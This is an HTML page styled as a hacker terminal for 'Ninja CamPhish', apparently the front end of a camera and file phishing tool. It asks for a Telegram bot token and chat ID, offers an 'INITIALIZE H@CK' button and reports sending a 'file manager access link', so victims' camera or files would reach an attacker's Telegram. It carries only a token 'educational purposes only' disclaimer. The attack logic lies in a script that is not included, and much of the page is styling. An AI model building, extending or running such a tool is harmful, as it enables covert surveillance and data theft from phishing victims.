<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ninja CamPhish Terminal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background-color: #0a0a0a;
            color: #0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            overflow-x: hidden;
        }
        
        .container {
            width: 100%;
            max-width: 800px;
        }
        
        .terminal {
            background-color: #000;
            border: 2px solid #0f0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
        }
        
        .terminal-header {
            background-color: #111;
            padding: 12px 15px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #0f0;
        }
        
        .terminal-buttons {
            display: flex;
            gap: 8px;
        }
        
        .button {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            cursor: pointer;
        }
        
        .red { background-color: #ff5f57; }
        .yellow { background-color: #ffbd2e; }
        .green { background-color: #28ca42; }
        
        .terminal-title {
            margin-left: 15px;
            font-size: 14px;
            color: #0f0;
            flex-grow: 1;
            text-align: center;
        }
        
        .terminal-content {
            padding: 25px;
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .logo {
            width: 120px;
            height: auto;
            filter: drop-shadow(0 0 8px rgba(0, 255, 0, 0.7));
        }
        
        .glitch {
            font-size: 28px;
            margin: 20px 0;
            text-shadow: 2px 2px 0 #f00, -2px -2px 0 #00f;
            animation: glitch 1.5s infinite;
            text-align: center;
            letter-spacing: 2px;
        }
        
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        .terminal-line {
            margin: 15px 0;
            line-height: 1.6;
            display: flex;
            align-items: flex-start;
        }
        
        .prompt {
            color: #0ff;
            margin-right: 10px;
            white-space: nowrap;
        }
        
        .input-group {
            margin: 20px 0;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #0ff;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px;
            background-color: #000;
            border: 1px solid #0f0;
            color: #0f0;
            font-size: 16px;
            border-radius: 4px;
            outline: none;
            transition: all 0.3s;
        }
        
        .input-group input:focus {
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        
        .hack-button {
            width: 100%;
            padding: 14px;
            background-color: #000;
            border: 2px solid #0f0;
            color: #0f0;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 25px;
            border-radius: 4px;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .hack-button:hover {
            background-color: #0f0;
            color: #000;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.7);
        }
        
        .result-container {
            margin-top: 30px;
            padding: 20px;
            background-color: #111;
            border-radius: 4px;
            border: 1px solid #0f0;
            display: none;
        }
        
        .result-title {
            color: #0ff;
            margin-bottom: 15px;
            font-size: 18px;
        }
        
        .file-link {
            color: #0f0;
            word-break: break-all;
            margin-bottom: 15px;
            line-height: 1.5;
        }
        
        .status-message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 4px;
            text-align: center;
            font-weight: bold;
        }
        
        .success {
            background-color: rgba(0, 255, 0, 0.1);
            border: 1px solid #0f0;
            color: #0f0;
        }
        
        .error {
            background-color: rgba(255, 0, 0, 0.1);
            border: 1px solid #f00;
            color: #f55;
        }
        
        .disclaimer {
            margin-top: 20px;
            padding: 15px;
            background-color: #111;
            border: 1px solid #f00;
            border-radius: 4px;
            font-size: 14px;
            color: #f55;
        }
        
        .developer {
            margin-top: 30px;
            text-align: center;
            color: #0ff;
            font-size: 14px;
            padding: 10px;
            border-top: 1px solid #333;
        }
        
        .blink {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .typing {
            overflow: hidden;
            border-right: 2px solid #0f0;
            white-space: nowrap;
            animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
        }
        
        @keyframes typing {
            from { width: 0 }
            to { width: 100% }
        }
        
        @keyframes blink-caret {
            from, to { border-color: transparent }
            50% { border-color: #0f0; }
        }
        
        @media (max-width: 600px) {
            .terminal-content {
                padding: 15px;
            }
            
            .glitch {
                font-size: 22px;
            }
            
            .logo {
                width: 100px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-buttons">
                    <div class="button red"></div>
                    <div class="button yellow"></div>
                    <div class="button green"></div>
                </div>
                <div class="terminal-title">root@cybermatrix:~# ninja_camphish.web</div>
            </div>
            <div class="terminal-content">
                <div class="logo-container">
                    <img src="https://i.ibb.co/4Rdmyt7m/IMG-20250528-114954-Picsart-Ai-Image-Enhancer-removebg-preview.png" alt="Hacker Icon" class="logo">
                </div>
                <h1 class="glitch">NINJA CAMPHISH</h1>
                
                <div class="terminal-line">
                    <span class="prompt">[root@matrix]$</span> <span class="typing">Connection established â€¢ System ready</span>
                </div>
                
                <div class="input-group">
                    <label for="token">TELEGRAM TOKEN</label>
                    <input type="text" id="token" placeholder="Ex: 7156722537:AAEvtWVJetHpPAgeJ7gu">
                </div>
                
                <div class="input-group">
                    <label for="chatid">CHAT ID</label>
                    <input type="text" id="chatid" placeholder="Ex: 5080596463">
                </div>
                
                <button class="hack-button">INITIALIZE H@CK</button>
                
                <div class="result-container" id="result">
                    <div class="result-title">SENDING FILE MANAGER ACCESS LINK...</div>
                    <div class="status-message" id="statusMessage"></div>
                </div>
                
                <div class="disclaimer">
                    <strong>Disclaimer:</strong> This tool is intended for educational purposes only.
                </div>
            </div>
        </div>
        
        <div class="developer">
            Developed by: @Ronju370 | Security Researcher
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
